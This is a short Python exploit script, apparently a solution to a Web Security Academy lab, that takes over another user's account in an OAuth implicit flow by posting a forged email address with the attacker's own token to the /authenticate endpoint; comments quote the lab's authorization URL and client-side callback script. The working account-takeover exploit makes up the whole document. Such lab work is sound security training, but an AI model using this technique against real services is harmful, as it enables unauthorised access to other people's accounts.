#!/usr/bin/python3

# In is OpenID OAuth authentiation flow, it sends user info to /authentication endpoint. Within you can easily takeover another just by changing the email address.


import requests
import json
import sys

def connect(url, endpoint, email):

    data = {
        "email" : email,
        "username" : "wiener",
        "token" : "U-y-aUEBle1Tdg0S936VjKz_ejHbcW7MPUnySQRxhGV"
    }

    s = requests.Session()
    r = s.post(url + endpoint, json.dumps(data))

    if r.status_code == 200:
        r =s.get(url + "/my-account")
        if "carlos" in r.text:
            print("[INFO] Account takeover successful!")
    else:
        print("[INFO] Something went wrong!")
        sys.exit(1)


if __name__ == '__main__':
    url = "https://acb61f1c1ee2365cc02e0328008700eb.web-security-academy.net"
    endpoint = "/authenticate"
    email = "carlos@carlos-montoya.net"

    connect(url, endpoint, email)


# https://oauth-ac851f2c1e043677c037034d020e0029.web-security-academy.net/auth?
# client_id=n644yofrlu0ycgt9g8mde
# &redirect_uri=https://acb61f1c1ee2365cc02e0328008700eb.web-security-academy.net/oauth-callback
# &response_type=token
# &nonce=-170985035
# &scope=openid%20profile%20email

# OAuth Redirect_url Script 

# <script>
# const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
# const token = urlSearchParams.get('access_token');
# fetch('https://oauth-ac851f2c1e043677c037034d020e0029.web-security-academy.net/me', {
#     method: 'GET',
#     headers: {
#         'Authorization': 'Bearer ' + token,
#         'Content-Type': 'application/json'
#     }
# })
# .then(r => r.json())
# .then(j => 
#     fetch('/authenticate', {
#         method: 'POST',
#         headers: {
#             'Accept': 'application/json',
#             'Content-Type': 'application/json'
#         },
#         body: JSON.stringify({
#             email: j.email,
#             username: j.sub,
#             token: token
#         })
#     }).then(r => document.location = '/'))
# </script>